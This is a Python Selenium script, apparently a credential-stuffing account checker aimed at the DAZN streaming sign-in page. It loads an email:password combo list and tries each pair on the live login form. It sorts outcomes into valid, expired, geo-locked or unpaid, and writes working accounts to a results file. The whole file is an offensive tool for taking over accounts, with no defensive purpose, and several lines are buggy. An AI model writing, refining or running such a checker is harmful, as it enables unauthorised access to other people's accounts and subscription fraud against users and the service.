import time
import os
import requests
from bs4 import BeautifulSoup as soup
from headers.dazn_header import header
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path
header()
file_directory = str(Path(__file__).parent)+'/dazn'
page = 'https://www.dazn.com/en-GB/signin'
error_flag = False
users = []
passwords = []
browser_options = Options()
browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
browser_options.add_argument = ('--headless')
os.makedirs('accounts',exist_ok=True)

with open(file_directory, 'r') as dazn:
	for line in dazn.readlines():
			users.append(line.split(':')[0].strip())
			passwords.append(line.split(':')[1].split(' | ')[0].strip())
			
index = 0
while index != len(users):
	with open('accounts/dazn_working_accounts','a') as account_results:
		try:
			print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
			browser = webdriver.Chrome(options = browser_options)
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(5)
			if browser.find_elements(By.XPATH,'//*[@id="onetrust-accept-btn-handler"]'):
				gdpr_accet_all_button = browser.find_element(By.XPATH,'//*[@id="onetrust-accept-btn-handler"]')
				gdpr_accet_all_button.click()
				time.sleep(5)				
			if browser.find_elements(By.XPATH,'//*[@id="root"]/div/div[2]/div/div[4]/div[1]'):
				geolocked_content_message = browser.find_element_By.xpath('//*[@id="root"]/div/div[2]/div/div[4]/div[1]').text
				print('\n\nIP: {} | Location: {} '.format(connection_error()[0], connection_error()[1]))
				print('Country not supported, please use a supported location/IP address.\nEnding.\n')
				exit()
			email_input_box = browser.find_element(By.XPATH,'//*[@id="email"]')
			password_input_box = browser.find_element(By.XPATH,'//*[@id="password"]')
			sign_in_button = browser.find_element(By.XPATH,'//*[@id="root"]/div[1]/main/div/div/form/button')
			email_input_box.send_keys(users[index])
			password_input_box.send_keys(passwords[index])
			sign_in_button.click()
			time.sleep(7)
			if browser.find_elements(By.XPATH,'//*[@id="root"]/div/div[2]/div/div[2]/div/section/header/h1'):
				print(" | {}:{} ---> Expired Account".format(users[index],passwords[index]))
				error_flag = True
			if browser.find_elements(By.XPATH,'//*[@id="password_error"]'):
				invalid_password = browser.find_element(By.XPATH,'//*[@id="password_error"]').text
				if 'Your password must contain at least one letter and one digit' in invalid_password:
					print(" | {}:{} ---> Password is invalid".format(users[index],passwords[index]))
				if 'is not allowed.' in invalid_password:
					print(" | {}:{} ---> Password contains invalid characters".format(users[index],passwords[index]))
				error_flag = True
			if browser.find_elements(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/h3'):
				not_found = browser.find_element(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/h3').text
				if "We couldn't find your account" in not_found:
					print(" | {}:{} ---> Credentials don't exist".format(users[index],passwords[index]))
					error_flag = True
			if browser.find_elements(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):			
				error = browser.find_element(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/div[1]/span').text				
				if 'Your email address and/or password are incorrect' in str(error):
					print(" | {}:{} ---> Credentials don't exist".format(users[index],passwords[index]))
				
				if 'You can only access DAZN in the country where you created your account' in str(error):
					print(' | {}:{} ---> Good Account, geo-locked login'.format(users[index],passwords[index]))
					account_results.write('{}:{} ---> Good Account, geo-locked login'.format(users[index],passwords[index]))
					
			elif browser.find_elements(By.XPATH,'//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):			
				expired_account_text = browser.find_element(By.XPATH,'//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div').text
				if 'Welcome back.' in expired_account_text:
					print(' | {}:{} ---> Account Expired'.format(users[index],passwords[index]))
					
				if 'Finish signing up' in expired_account_text:
					print(' | {}:{} ---> No Payment Method'.format(users[index],passwords[index]))				
			elif error_flag != True:
				print(' | {}:{} ---> Success!'.format(users[index],passwords[index]))
				account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))				
			index +=1
			error_flag = False
		except ElementClickInterceptedException:
			print(' | Click Intercepted, iteration index was not incremented.')
		
		except NoSuchElementException:
			print(' | Element hidden, iteration index was not incremented.')
			
		except InvalidSessionIdException:
			print('Session terminated unexpectedly.\n')
			break
